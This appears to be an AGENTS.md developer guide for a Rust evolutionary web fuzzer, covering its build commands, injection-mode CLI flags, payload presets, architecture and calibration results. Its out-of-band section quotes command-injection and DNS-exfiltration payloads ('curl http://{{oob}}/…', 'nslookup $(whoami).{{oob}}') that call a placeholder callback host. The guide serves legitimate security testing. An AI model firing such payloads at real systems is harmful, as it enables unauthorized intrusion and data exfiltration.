# AGENTS.md — fuzzz

## What This Project Is

Evolutionary web fuzzer engine in Rust. Atom-chain generation + havoc mutation, driven by response signal feedback. Extracted from [re:Vise](https://github.com/MamiyaTakuji2005/re-Vise).

## Build & Run

```bash
cargo check                              # type-check (fast)
cargo test                               # unit tests + calibration regression guard
cargo test --test calibration -- --nocapture   # per-target hit rates (deterministic)
cargo run --bin report --release       # benchmarks
cargo run --bin calibrate --release -- targets.toml   # full calibration sweep
cargo run --bin stress --release -- stress_targets.toml
cargo run --bin fuzz --features http -- --preset sqli --url <URL> --inject-query <p>  # headless real-target runner
cargo run --bin fuzz --features http -- --preset sqli --url <URL> --inject-query <p> --concurrency 4 --rate-limit 10  # concurrent + rate-limited
cargo run --bin fuzz-gui --features gui --release   # GUI workbench
```

The real HTTP transport (`HttpProbe`) lives in `src/http.rs` behind the `http`
feature (reqwest only; `gui` builds on top of it). Keepalive is **off by
default** — every probe opens a fresh connection, so the target can't serialize
probes down one persistent pipe. Enable the `keepalive` feature to reuse
connections for stateful/session targets, or ones that throttle connection churn.

`fuzz` is the headless CLI: point a preset at a live URL with a probe budget. Its
report is mechanics-first (baseline, probes, every signal observed), so the
request → baseline-diff → classify pipeline stays visible even when nothing
confirms. Session flags carry into **every** request, baseline and probes alike:
`--header 'Name: Value'` (repeatable) and `--cookie 'a=b'` for targets behind a
login like DVWA, and `--csrf-url <URL>` to refresh a per-request CSRF token
(cookie store on) for stateful login forms. `--jsonl` prints one JSON object per
hit to stdout (summary to stderr, otherwise silent) — pipe it into jq, or into
the single-target spider loop (`06-crawler`), which maps a target's endpoints →
fuzzes each → collects the JSONL findings.

**Injection modes** — where `{{payload}}` lands. Mutually exclusive; if several
are set the precedence is JSON body → body template → query:

- `--inject-query <param>` — inject into a single query parameter.
- `--inject-body '<tmpl>'` — form body carrying a `{{payload}}` placeholder.
- `--inject-body-file <path>` — same as `--inject-body`, but reads the template
  from a file so trailing newlines survive (shell `$(…)` strips them); needed for
  NDJSON `_bulk`-style bodies. Set the type with `--content-type <ct>`.
- `--inject-json` — the payload *is* the whole `application/json` body (prototype
  pollution / NoSQLi).

`--seed <u64>` fixes the RNG for deterministic replay (omit for entropy); with
`--concurrency`, the same seed and same concurrency reproduce the same candidate
sequence.

**OOB templating:** payloads needing a call-back (blind CMDi, OOB XXE, SSRF, DNS
exfil) carry the placeholder `{{oob}}` — a **bare host**, so the payload writes
its own scheme (`curl http://{{oob}}/…`, `nslookup $(whoami).{{oob}}`). Supply
the collaborator with `--oob-url <url-or-host>` (accepts the `{{interactsh-url}}`
alias); it's substituted at injection time. Without it, OOB payloads are skipped
(reported to stderr), not sent as dead probes. See the heavy note above
`substitute_oob` in `agent.rs` for why `{{oob}}` is a host, not a URL.

**External module files** — `--preset <arg>` is dual-purpose: a known class name
(`sqli`, `ssrf`, …) selects the compiled-in preset; anything else is a path to a
module `.json`. A module is a *diff over a base class*: it names a `class` (which
supplies the detectors + feedback, and any section the file omits) then overrides
the data half — `grammar` (`atoms`, `chain`, `placement`, `length`), `payloads`,
`gen_ratio`, `shells`. Grammar and payloads are separate sections in one file, so
"my seeds but the hardcoded atoms" is just an omitted `grammar`. The chain mirrors
the internal `from → {to → weight}` map — you edit the tuned artifact directly.
See `examples/ssrf-cloud-metadata.json` for a worked example, and `src/module.rs`
for the schema. A class name shadows a same-named file (`./name.json` forces the
file). A non-empty `signals` array makes the module **self-contained** — it names
its detectors (`["status","error:dbms","body-signature:cloud"]`), resolved through
`signals::registry` (`KNOWN_SIGNALS` lists the names: `status`, `size`,
`reflection`, `time-delay`, `body-diff`, `proto-pollution`, `error:dbms`,
`error:nodejs`, `body-signature:file`, `body-signature:cloud`, `novelty`) and
replacing the base class's set. Omit it to inherit the class's detectors. Feedback
still comes from the base `class` (not yet name-addressable). Loaded via
`ModuleFile::from_path` → `Fuzzer::module_file`.

`tests/calibration.rs` is a deterministic regression guard: it runs every
`targets.toml` target through the loop at fixed seeds and asserts each clears a
per-target hit-rate floor (and that `waf-blocked` stays at 0). It catches
silent calibration regressions — a target collapsing to 0, or the ssrf timing
re-probe halving — without a full sweep. The `calibrate` binary is for
exploring the parameter space; this test locks in the result.

Binaries (`src/bin/`): `calibrate`, `stress`, `signal_sweep`, `atom_audit`, `cap_sweep`, `havoc_ablation`, `sweep`, `bench`, `report`, `fuzz` (feature `http`), `fuzz-gui` (feature `gui`).

**fuzz-gui** is the interactive workbench — exposes all 9 presets, 4 fuzz modes, 6 injection points, request timeout, an OOB collaborator field, and stop-on-first-hit. Uses the `Fuzzer` builder API directly with progress reporting and cancellation.

**Prototype pollution** (`--preset proto`, JSON body via `--inject-json`) confirms
server-side PP with detection gadgets rather than blind pollution: the `json spaces`
gadget makes the response JSON re-indent, which `ProtoPollutionClassifier` catches
(same content, whitespace-only diff → confirms). A successful gadget pollutes the
live app persistently until restart — treat a PP run as invasive.

**Recall-first hunt mode:** `fuzz --hunt` (or `Fuzzer::hunt()`) bolts on the
`NoveltyClassifier` — fingerprints each response as `(status, size, words,
lines)` and flags anything unlike the baseline as `anomaly`, reported but not
confirmed. Surfaces unusual responses even without a matching vuln signature.

**Design notes:** `ANOMALY.md` — the recall-first anomaly-detection design (why
this project wants recall where ffuf-style tools want precision; `NoveltyClassifier`
is built, autocalibration + wobble handling are the remaining pieces). Inline
`// recall-first:` comments in `signal.rs`, `baseline.rs`, `corpus.rs`, and
`bin/fuzz.rs` point back to it.

## Architecture

```
atoms → WeightedSampler (ChainTable) → HavocMutator → EvolutionaryLoop (signals + feedback) → Probe/transport
```

| Module | Responsibility |
|--------|---------------|
| `src/evolutionary/atoms.rs` | Atom vocabulary, ChainTable (Markov-like transitions), WeightedSampler, PlacementPolicy, LengthPolicy |
| `src/evolutionary/havoc.rs` | 12 stochastic mutation operators with weighted scheduling |
| `src/evolutionary/corpus.rs` | SeedCorpus with energy-bucketed power scheduling, Feedback trait, HttpFeedback |
| `src/evolutionary/evolution.rs` | Main loop blending generation (gen_ratio) with mutation |
| `src/evolutionary/rng.rs` | Dual-mode RNG (SmallRng for speed, ChaCha12 for replay stability) |
| `src/signals/signal.rs` | classifiers: Status, Size, Reflection, TimeDelay, BodyDiff, Error, BodySignature (leak-content), Novelty (anomaly), ProtoPollution (json-spaces gadget) |
| `src/signals/mutator.rs` | Signal-guided payload mutator (alternative to evolutionary engine) |
| `src/baseline.rs` | BaselineProfile — null-hypothesis signal filtering + confidence scoring |
| `src/agent.rs` | Fuzzer builder API with 9 vuln presets (SQLi, XSS, SSTI, CMDi, SSRF, path traversal, NoSQLi, XXE, prototype pollution) |
| `src/payloads.rs` | Payload tables — curated corpus (`payload_data/*.json`, ~600 payloads across 9 classes with context/severity/targets metadata) loaded via `include_str!` |
| `src/mock_config.rs` | TOML-defined mock targets for offline calibration |

## Key Concepts

- **Atoms**: Minimal string tokens (`'`, `<`, `UNION`, `{{`, etc.) — the vocabulary.
- **ChainTable**: Sparse `(from, to) → weight` map for transition probabilities. Missing pairs default to 1.0.
- **gen_ratio**: 0.0 = pure havoc mutation, 1.0 = pure generation, 0.7 = default blend.
- **HavocOps**: 12 mutation operators (insert, replace, delete, duplicate, splice, URL-encode, boundary values, repeat, wrap, reverse, uppercase).
- **SeedCorpus**: AFL-inspired energy scheduling. High-energy entries get more mutations.
- **BaselineProfile**: Sends empty-payload request first, classifies ambient signals, filters them from probe results.

## Conventions

- Release profile: `opt-level = "z"`, LTO, single codegen unit, stripped symbols (size-optimized).
- Deterministic replay: use `RngMode::ChaCha12` + fixed seed.
- Concurrency replay: same seed + same `max_concurrent` = same candidate sequence. Use `max_concurrent=1` for bit-exact sequential replay.
- Mock targets defined in TOML (`targets.toml`, `stress_targets.toml`, `nums_targets.toml`).
- Calibration data/plots/scripts live in `stuff/` (gitignored).

## Calibration Status

Analysis is complete (see `stuff/CALIBRATION_TODO.md` and `stuff/CALIBRATION_IMPLICATIONS.md`).

**Mock-harness fixes applied** (previously three targets were stuck at 0 hits due
to test-harness artifacts, not the engine):
- Fixed `mock_config.rs` payload truncation at `=` → `xss-reflected` 0 → ~272/300.
- Realistic mock leak bodies + new `BodySignatureClassifier` (per-class content
  signatures) so path-traversal / SSRF can confirm on leaked content rather than
  the deliberately-noisy `SizeDelta` → both 0 → ~280/300. Targets declare
  `confirm_signatures` in TOML; `calibrate` wires them per-target.

**Tuning changes applied** (before/after via `calibrate targets.toml`, gen=0.7
baseline; all 8 targets improved, avg +20.1 hits/1k):

1. ✅ `ops_per_step`: 4 → 1 (`havoc.rs`) — fewer ops stay near the seed.
2. ✅ `replace_token` weight: 3.0 → 0.5 (`havoc.rs`) — replacing pushes off-trigger.
3. ✅ `repeat_payload` weight: 0.5 → 1.5 (`havoc.rs`) — repetition keeps trigger intact.
5. ✅ Remove `SizeClassifier` from SSTI preset (`agent.rs`).
6. ✅ `LengthPolicy` presets bias short + `min_atoms=1` (`atoms.rs`); the three
   presets that used `long()` (xss, ssti, path_traversal) switched to `short()`.

**Deferred:**

4. ⏸️ `TimeDelayClassifier.min_abs_ms`: 500 → 200 (`signal.rs`). Applying it
   *halved* ssrf's hits/1k — not lost detection, but the timing re-probe
   confirmation (`evolution.rs:354`) doubles probe cost on ssrf's deterministic
   200ms mock delay. No target in the current suite lives in the 200–500ms band
   to justify 200, so it buys nothing here. Revisit once a real time-based target
   in that band exists (and consider: a definitive non-timing confirmation
   like `LeakSignature`/`Error` should let the loop skip the timing re-probe).

## File Layout

```
src/
├── lib.rs                 # crate root
├── agent.rs               # Fuzzer builder API (main public interface)
├── baseline.rs            # null-hypothesis signal filtering
├── mock_config.rs         # TOML mock targets
├── payloads.rs            # curated payload corpus (payload_data/*.json)
├── bin/                   # 11 tool binaries (see list above)
├── evolutionary/          # core engine (atoms, havoc, corpus, evolution, rng)
└── signals/               # classification + mutator primitives
examples/                  # digits demo, module-file example (ssrf-cloud-metadata.json)
stuff/                     # calibration data, plots, scripts (gitignored)
targets.toml               # main calibration mock targets
stress_targets.toml        # extended stress test targets
nums_targets.toml          # numeric distribution test targets
```
